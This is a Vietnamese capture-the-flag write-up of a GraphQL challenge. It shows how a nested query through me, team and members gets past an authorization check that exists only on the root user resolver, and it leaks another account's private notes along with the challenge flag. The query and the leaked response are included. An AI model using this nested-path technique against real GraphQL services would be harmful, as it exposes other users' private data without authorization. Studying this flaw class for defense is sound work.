# Shape of Query — WEB (300 pts)

**Flag:** `POCTF{81.612.EB7ZOZUZT7FJHWR2.YQXWHGRFYSBYU46VGKVYD22DNN}`
**Target:** `https://shape-of-query.pointeroverflowctf.com`

## Đề bài

Bối cảnh bài toán đưa người chơi vào một "Collaborative Research Portal" (Cổng nghiên cứu cộng tác) do chính tác giả tự xây dựng. Lời mời gọi thử nghiệm hệ thống đi kèm với lời thú nhận đầy lo lắng về vấn đề **bảo mật người dùng** (user security), bởi tác giả sợ rằng "các nhà nghiên cứu sẽ tọc mạch vào tài sản của nhau". 
Portal được cách ly hoàn toàn trên một tên miền phụ (subdomain) riêng biệt. Để đăng nhập, người chơi phải sử dụng mã phiên (session token) riêng của đội mình (mỗi lần tải lại trang, hệ thống sẽ sinh token mới có hiệu lực trong vòng 15 phút). Sau khi lọt qua cổng đăng nhập, thứ chờ đợi ta bên trong là một **API GraphQL toạ lạc tại `/graphql`, với tính năng introspection (tự phản chiếu) đã được bật sẵn**.

## Phân tích ban đầu

Mặt tiền trang đăng nhập chỉ chứa duy nhất một ô để điền token. Khi gửi gói tin `POST /session/exchange` chứa token hợp lệ, máy chủ trả về kết quả `{"ok":true,"team_id":612}` và hào phóng gắn một cookie `session`. Tiến thẳng vào đường dẫn `/graphql`, giao diện GraphiQL hiện ra đầy đủ.

Nhờ tính năng introspection đã mở, cấu trúc dữ liệu phơi bày 4 kiểu đối tượng (type) vô cùng cốt lõi:

```graphql
type Query { me: User   user(id: ID!): User }
type User  { id: ID!  username: String!  role: UserRoleEnum  team: Team  privateNotes: String }
type Team  { id: ID!  name: String  members: [User] }
enum UserRoleEnum { ADMIN MEMBER }
```

Phần mô tả đi kèm trên máy chủ tự bóc phốt các lỗ hổng của mình một cách lộ liễu: field `user` được dán nhãn "You may only view yourself" (Chỉ được xem thông tin cá nhân), `privateNotes` cảnh báo "Visible to the account owner only" (Chỉ hiển thị với chủ tài khoản), và `members` nhấn mạnh "Cross-team enumeration is blocked" (Chặn liệt kê chéo giữa các đội). Liên kết những manh mối này lại, mục tiêu cuối cùng không thể nhầm lẫn: ta phải đánh cắp được nội dung trường `privateNotes` của một tài khoản khác trong hệ thống.

Thử nghiệm tra cứu `me` trả về đối tượng `researcher_612` với nội dung `privateNotes` vô thưởng vô phạt: "Grocery list, personal reminders. Nothing worth reading." - rõ ràng đây chỉ là một mồi nhử.

## Chuỗi khai thác

**Bước 1 - Lập bản đồ tới field đích.** 
Theo thói quen, nhiều người sẽ lao đầu vào thử trường `Query.user`, nhưng đó không phải là con đường duy nhất dẫn tới `privateNotes`. Còn một lộ trình vòng vèo khác: đi qua `Query.me -> User.team -> Team.members -> privateNotes`. Đáng chú ý là dòng ghi chú giới hạn quyền truy cập "You may only view yourself" chỉ được gắn vào trực tiếp trường `Query.user`.

**Bước 2 - Thâm nhập theo đường lồng nhau (Nested Path).**
Triển khai ngay một truy vấn nhiều tầng:

```graphql
{ me { team { members { id username role privateNotes } } } }
```

Phản hồi trả về đầy kinh ngạc:

```json
{"data":{"me":{"team":{"members":[
  {"id":"user_612","privateNotes":"Grocery list, personal reminders. Nothing worth reading.","role":"MEMBER","username":"researcher_612"},
  {"id":"admin_612","privateNotes":"POCTF{81.612.EB7ZOZUZT7FJHWR2.YQXWHGRFYSBYU46VGKVYD22DNN}","role":"ADMIN","username":"admin_612"}
]}}}}
```

Kinh hãi thay, trường `Team.members` liệt kê trơn tuột thông tin mọi thành viên trong đội cùng với trường `privateNotes` **hoàn toàn thô (raw)** mà không mảy may trải qua bất kỳ một lớp kiểm tra phân quyền nào. Khảo sát cấu trúc hệ thống, ta thấy mỗi đội đều được phân phối một tài khoản mang tên `admin_<team_id>`, và là cờ của mỗi đội được giấu cẩn thận bên trong phần ghi chú cá nhân của chính tên admin nội bộ đó.

**Bước 3 - Xác nhận dữ liệu không bị lai tạp.** 
Nếu ta chạy lệnh truy vấn trực tiếp `user(id:"admin_612")`, kết quả trả về lập tức là `null`, mặc dù tài khoản admin đó nằm chung đội với ta. Bằng chứng này tố cáo một sự thật: bộ não kiểm tra phân quyền bảo mật chỉ được cài cắm độc nhất ở resolver của `Query.user`, còn resolver của `Team.members` lại hoàn toàn vắng bóng cơ chế bảo vệ. Thêm vào đó, chuỗi nonce ngẫu nhiên `EB7ZOZUZT7FJHWR2` trong thân cờ khớp chính xác đến từng ký tự với nonce trong session token của trang chủ thử thách, xoá tan mọi nghi ngờ về tính chính danh của lá cờ thuộc đội 612.

**Bước 4 - Nộp cờ.**

```http
POST /challenges/shape-of-query/submit
{"flag":"POCTF{81.612.EB7ZOZUZT7FJHWR2.YQXWHGRFYSBYU46VGKVYD22DNN}"}
{"correct":true,"message":"Correct."}
```

## Flag

```
POCTF{81.612.EB7ZOZUZT7FJHWR2.YQXWHGRFYSBYU46VGKVYD22DNN}
```

Bài học cốt tử của lỗ hổng: Trong hệ sinh thái GraphQL, các lập trình viên thường có thói quen nguy hiểm là chỉ cài đặt cơ chế phân quyền bảo mật ở **bộ giải quyết (resolver) của những trường (field) thuộc cấp gốc**. Do đó, một khối dữ liệu nhạy cảm có thể bị lột trần nếu ta tìm ra **một lộ trình khác** đan xen qua đồ thị kiểu (type graph) để chạm tới nó. Đừng mù quáng kiểm tra "endpoint này có bị chặn không", mà hãy thông minh liệt kê mọi con đường để mò tới được field đích.

## Phục dựng (Reproduce)

```bash
python exploit.py "<điền mã session token lấy trên trang challenge>"
```
